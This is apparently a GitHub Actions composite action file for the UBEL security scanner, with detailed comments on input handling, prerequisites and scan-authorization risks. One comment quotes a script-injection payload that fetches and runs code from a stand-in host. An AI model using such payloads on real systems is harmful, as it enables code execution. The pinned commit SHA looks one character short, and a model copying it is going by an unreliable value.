name: 'UBEL Security Scan and dependencies firewall'
description: 'Supply-chain, secrets, SAST, cloud misconfiguration, mobile app, native binary, dependency-release and MCP server / client scanning via UBEL'
inputs:
  command:
    description: 'Which UBEL bin to run: sast, mal, chunk, cicd, agent, platform, secrets, license, cloud, mobile, binary, package, mcp-client, mcp-server, url, domain, host, easm, npm, pnpm, bun, yarn, docker, pip, pipx, uv, conda, poetry, cargo, bundle, go, dotnet, dart, flutter, swift, composer, apt, dnf, yum, resbom, sbom'
    required: true
  version:
    description: 'Pinned @arcane-spark/ubel-node version'
    default: '0.26.0'
  args:
    description: 'Extra flags, e.g. --fail-on high'
    default: ''
runs:
  using: 'composite'
  steps:
    # Pinned by commit SHA, not the mutable `v4` tag — a tag can be
    # repointed by the upstream maintainer or, in a compromise scenario,
    # by an attacker with write access to that repo; a SHA can't.
    # SHA below corresponds to the v4.0.2 release tag.
    - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f # v4.0.2
      with:
        node-version: '20'

    # `command`, `version`, and `args` are step INPUTS, not hardcoded
    # values — a caller elsewhere in a workflow (or a reusable-workflow
    # chain feeding this action a computed value) could supply anything.
    # They're passed via `env:` and referenced as shell variables here
    # rather than interpolated with `${{ }}` directly into the `run:`
    # script text below. That distinction matters: `${{ }}` expansion
    # happens BEFORE bash ever sees the script, so an input containing
    # something like `; curl evil.sh | bash` would be spliced into the
    # script as literal shell syntax and executed — this is GitHub's own
    # documented "script injection" risk for composite/workflow actions
    # (see: Security hardening for GitHub Actions, "Understanding the
    # risk of script injection"). Referencing them as `$COMMAND`/`$ARGS`
    # instead means bash only ever sees them as data.
    #
    # `command` is additionally checked against an explicit allow-list kept
    # in sync with UBEL's actual registered `package.json` bin names (not
    # derived from it automatically — this list must be updated by hand
    # whenever a bin is added or removed there), so this can never
    # construct or execute a binary name that isn't one of ours regardless
    # of what a caller passes.
    #
    # `pip`/`pipx` need a `python3`/`python` interpreter on PATH to create
    # their venv — `setup-node` above doesn't provision one, so a workflow
    # using either command needs its own `actions/setup-python` step (or a
    # runner image, e.g. GitHub-hosted `ubuntu-latest`, that already has one).
    #
    # `uv` needs BOTH a `python3`/`python` interpreter (same as above, to
    # create the venv) AND the `uv` binary itself on PATH — neither is
    # provisioned by `setup-node`; use `astral-sh/setup-uv` for the latter.
    #
    # `conda` needs the `conda` binary itself, which `setup-node` doesn't
    # provision (and which isn't guaranteed to be on PATH on a runner image):
    # add a preceding step such as `conda-incubator/setup-miniconda`, or make
    # sure conda is on PATH / `CONDA_EXE` is exported. No separate Python
    # interpreter is needed on the runner for this command.
    #
    # `poetry` needs the `poetry` binary itself, which `setup-node` doesn't
    # provision: add a preceding step such as `snok/install-poetry` (or
    # `pipx install poetry`), plus a Python interpreter for it to use. It resolves in
    # a scratch copy of the checked-out project, so `check` never modifies the workspace.
    #
    # `cargo` needs the Rust toolchain (the `cargo` binary) on PATH, which
    # `setup-node` doesn't provision: use a runner image that has it, or add a
    # preceding step such as `dtolnay/rust-toolchain`. It resolves in a scratch
    # copy of the checked-out project, so `check` never modifies the workspace.
    #
    # `yarn`, `bundle`, `go`, `dotnet`, `dart`, `flutter` and `swift` are the
    # LOCKFILE-REQUIRED engines (Yarn, Bundler, Go modules, .NET/NuGet, Dart, Flutter,
    # SwiftPM). UBEL has no safe way to resolve a candidate lockfile for them, so
    # `check`/`install` never resolve anything: the project's lockfile (yarn.lock,
    # Gemfile.lock, go.sum, packages.lock.json, pubspec.lock, Package.resolved) must
    # already be committed, `check` scans exactly what it pins, and `install` scans it
    # and then runs the ecosystem's frozen install of that same set. A missing or empty
    # lockfile fails the step (exit 1) before any package manager runs, and so does any
    # package argument in `args` in ANY mode — `args` is just the mode, e.g. `check`.
    # `check` only reads files, so it needs no toolchain on the runner; `install` needs
    # the package manager itself on PATH, which `setup-node` doesn't provision (yarn
    # comes with Node; otherwise use e.g. `ruby/setup-ruby`, `actions/setup-go`,
    # `actions/setup-dotnet`, `dart-lang/setup-dart`, `subosito/flutter-action`, or a
    # runner image that already has Swift).
    #
    # `apt`/`dnf`/`yum` are three separate commands, each bound to exactly
    # one native package manager — same one-binary-per-tool shape as
    # `npm`/`pnpm`/`bun` above, no auto-detection between them. Each only
    # works on a Linux runner that actually has that specific tool present —
    # e.g. `dnf`/`yum` are no-ops on GitHub-hosted `ubuntu-latest`, and all
    # three are no-ops on `windows-latest`/`macos-latest`. `install` mode
    # also shells out to `sudo <pkg-manager> install`, which needs
    # passwordless sudo; GitHub-hosted Ubuntu runners have this by default,
    # but a locked-down self-hosted runner may not.
    #
    # `cloud` needs credentials for whichever provider(s) it's scanning,
    # supplied as env vars on this step (this action doesn't request or
    # forward any itself) — a GitHub-hosted runner isn't on AWS/GCP/Azure,
    # so the metadata-server/managed-identity fallback each provider has
    # won't apply here:
    #   AWS:   AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY (+ AWS_SESSION_TOKEN)
    #   GCP:   GOOGLE_APPLICATION_CREDENTIALS pointing at a checked-out
    #          service-account key file (e.g. written from a secret earlier
    #          in the job — never commit the key itself)
    #   Azure: AZURE_TENANT_ID + AZURE_CLIENT_ID + AZURE_CLIENT_SECRET, plus
    #          AZURE_SUBSCRIPTION_ID (always required regardless of provider)
    #
    # `mobile` (`ubel-mobile`) and `binary` (`ubel-binary`) scan a BUILT ARTIFACT, not
    # the checked-out project: `args` is the path of the file, e.g. `app-release.apk` /
    # `.aab` / `.ipa` / `.xapk` / `.apks` / `.apkm` for `mobile`, or an ELF / Mach-O / PE
    # executable or library for `binary`, followed by any flags. The file has to exist on
    # the runner already, so build or download it in an earlier step. Neither command needs
    # a toolchain, an SDK or credentials (no aapt, apktool, otool, readelf ... — both read the
    # file with Node built-ins, and nothing in it is executed). The file itself is never
    # uploaded; the only outbound traffic is the lookup of package URLs / component names and
    # versions against OSV.dev and NVD, so the runner needs network access to both (mirrorable
    # through UBEL_OSV_ENDPOINT / UBEL_NVD_ENDPOINT, set as env vars on this step). Both
    # exit 0 only when the `--fail-on` gate passed AND the analysis was complete: exit 2 means
    # the gate tripped (or bad arguments), and exit 3 means nothing tripped it but part of the
    # file could not be analysed (an unreadable entry, a failed OSV/NVD lookup, a FairPlay-
    # encrypted binary ...), which fails the step on purpose — a clean result over partial
    # coverage is not a pass. Add `--allow-partial` to `args` to accept it, or
    # `--fail-on none` to disable the gate. `mobile --online` is the one exception to the
    # network rule above: it also contacts hosts NAMED BY THE APP (assetlinks.json of its
    # verified link hosts, one shallow read of a Firebase Realtime Database, one Remote Config
    # fetch). Same rule as `url`: only pass it an app you are allowed to test.
    #
    # `url` (EASM/`ubel-url`) is different from every other command above in
    # one important way: the thing it acts on — the target domain/URL — is
    # itself part of `args`, not a separately-credentialed resource. Unlike
    # `cloud` (gated by credentials you control) or `npm`/`pip`/etc. (acting
    # on this repo's own checked-out manifest), a workflow that builds `args`
    # from anything less trusted than its own hardcoded config (a PR title,
    # an issue body, another job's output) could be tricked into having your
    # CI runner send live requests to a target you never intended to scan.
    # `ubel-url` itself only ever fingerprints + queries OSV/NVD — it doesn't
    # exploit anything — but per its own README, only ever pass it a target
    # your organization owns or is explicitly authorized to test; treat
    # `args` here with the same care as any other step that makes outbound
    # network calls to a caller-influenced destination.
    #
    # `host` (EASM/`ubel-host`) is the same shape of risk as `url` above, one
    # step further: the target host is likewise part of caller-influenced
    # `args`, but this command additionally connect-scans every port in
    # range on it (30,000 by default) before fingerprinting whatever answers
    # HTTP(S) — an `args`-sourced target here means a CI runner sweeping an
    # unintended host's entire port range, not just one request to it. Same
    # rule applies: only ever pass a host your organization owns or is
    # explicitly authorized to test.
    #
    # `easm` (EASM/`ubel-easm`) combines `domain`'s and `host`'s risks rather
    # than adding a new one: the `args`-sourced root domain is expanded into
    # an unbounded, caller-uninfluenced subdomain list (same as `domain`),
    # each of THOSE is then resolved to an IP and full-range port-scanned
    # (same as `host`) — so a CI runner ends up connect-scanning every port
    # on every IP a domain's subdomains happen to resolve to, with no single
    # `args` value naming any one of those IPs directly. It also carries one
    # risk neither `domain` nor `host` does on its own: several subdomains
    # commonly resolve to a SHARED IP (a CDN/edge IP, shared hosting) that
    # isn't the domain owner's exclusive infrastructure, and this command has
    # no way to detect that — it only de-duplicates identical IPs, it does
    # not vet who else's traffic that IP also serves. Authorization to scan a
    # domain does not by itself authorize a full port sweep of every IP that
    # domain's DNS happens to point at; a workflow using `easm` unattended in
    # CI should pin `args` down with `--exclude`/`--exclude-ip` for anything
    # not exclusively the caller's own, the same care `url`'s own comment
    # above asks for around caller-influenced targets generally.
    # `package` (`ubel-package`) downloads ONE dependency release from a registry and
    # analyses the archive: `args` is `<name> <version> <ecosystem>` followed by any flags,
    # e.g. `left-pad 1.3.0 npm --fail-on high` (add `--registry <url>` for a mirror or private
    # registry). Nothing is installed, built or run, and no toolchain is needed on the runner:
    # only network access to the registry and to OSV.dev / NVD (mirrorable through
    # UBEL_OSV_ENDPOINT / UBEL_NVD_ENDPOINT). Exit codes are the same as `mobile` / `binary`:
    # 2 = the gate tripped (or bad arguments), 3 = nothing tripped it but part of the package
    # could not be analysed (a failed OSV / NVD lookup, `--offline`, a file over a limit), which
    # fails the step on purpose; add `--allow-partial` to `args` to accept it.
    # Like `url`, `package` acts on a caller-influenced target: the package name, the version and
    # any `--registry` / `--header` / `--token` in `args` decide which server the runner contacts
    # and which credentials it sends there (credentials only ever go to the registry's own host).
    # Never build `args` from anything less trusted than the workflow's own hardcoded config
    # (a PR title, an issue body, another job's output).
    #
    # `mcp-client` (`ubel-mcp-client`) is a STATIC, OFFLINE scan of how MCP clients are set up
    # on the runner: the user-level configuration files (Claude Desktop / Code, Cursor, VS Code,
    # Windsurf, Cline / Roo, Zed, Gemini CLI, Codex, Amazon Q, LM Studio) and the checked-out
    # project's own files (`.mcp.json`, `.cursor/`, `.vscode/` ...). On a fresh GitHub-hosted runner
    # only the project files exist, so `args` is usually just flags, e.g. `--fail-on high`; add
    # `--project <dir>` for another directory, `--config <file>` for a file elsewhere, or
    # `--source <dir>` for an app that embeds an MCP client. It reads files only: nothing is
    # contacted and nothing is started. No toolchain is needed.
    #
    # `mcp-server` (`ubel-mcp-server`) needs a target in `args`: an endpoint URL, `--from-config`,
    # `--discover`, `--source <dir>` or `--package npm:<name>[@<version>]` / `pypi:<name>[==<version>]`,
    # followed by any flags, e.g. `https://mcp.example.com/mcp --fail-on high`. It probes running
    # HTTP / SSE servers with `initialize` and the list methods only (it never calls a tool and never
    # starts a server), downloads and READS the packages a launcher would fetch (nothing is installed
    # or run), and needs no toolchain; the runner needs network access to the endpoints, the package
    # registries and OSV.dev / NVD (mirrorable through UBEL_OSV_ENDPOINT / UBEL_NVD_ENDPOINT). Process
    # observation (`/proc`) works on Linux runners only. Credentials are sent only if `args` carries
    # `--token` / `--header` (or `--use-config-headers`), and only to that server's own URL: pass them
    # from a secret, never inline. A project file that declares a loopback / private URL is not probed
    # unless `--trust-project` is given, so a checked-out repository cannot aim the runner at internal
    # hosts. Like `url` and `package`, `mcp-server` acts on caller-influenced targets: never build
    # `args` from anything less trusted than the workflow's own hardcoded config (a PR title, an
    # issue body, another job's output).
    # Both exit codes follow `mobile` / `binary` / `package`: 2 = the gate tripped (or bad
    # arguments), 3 = nothing tripped it but part of the analysis could not be done (an unparseable
    # config, an unreachable `--url` target, a failed registry or advisory lookup), which fails the
    # step on purpose; add `--allow-partial` to `args` to accept it. `mcp-client` / `mcp-server` exist
    # only in releases that ship the `ubel-mcp-client` / `ubel-mcp-server` binaries: pin `version` to one.
    #
    - shell: bash
      env:
        UBEL_ACTION_COMMAND: ${{ inputs.command }}
        UBEL_ACTION_VERSION: ${{ inputs.version }}
        UBEL_ACTION_ARGS:    ${{ inputs.args }}
      run: |
        case "$UBEL_ACTION_COMMAND" in
          sast|mal|chunk|cicd|agent|platform|secrets|license|cloud|mobile|binary|package|mcp-client|mcp-server|url|domain|host|easm|npm|pnpm|bun|yarn|docker|pip|pipx|uv|conda|poetry|cargo|bundle|go|dotnet|dart|flutter|swift|composer|apt|dnf|yum|resbom|sbom)
            ;;
          *)
            echo "::error::Unknown command '$UBEL_ACTION_COMMAND' — must be one of: sast, mal, chunk, cicd, agent, platform, secrets, license, cloud, mobile, binary, package, mcp-client, mcp-server, url, domain, host, easm, npm, pnpm, bun, yarn, docker, pip, pipx, uv, conda, poetry, cargo, bundle, go, dotnet, dart, flutter, swift, composer, apt, dnf, yum, resbom, sbom"
            exit 1
            ;;
        esac

        if ! [[ "$UBEL_ACTION_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-.].+)?$ ]]; then
          echo "::error::version input must be a plain semver string, got '$UBEL_ACTION_VERSION'"
          exit 1
        fi

        npx -p "@arcane-spark/ubel-node@${UBEL_ACTION_VERSION}" -- ubel-${UBEL_ACTION_COMMAND} $UBEL_ACTION_ARGS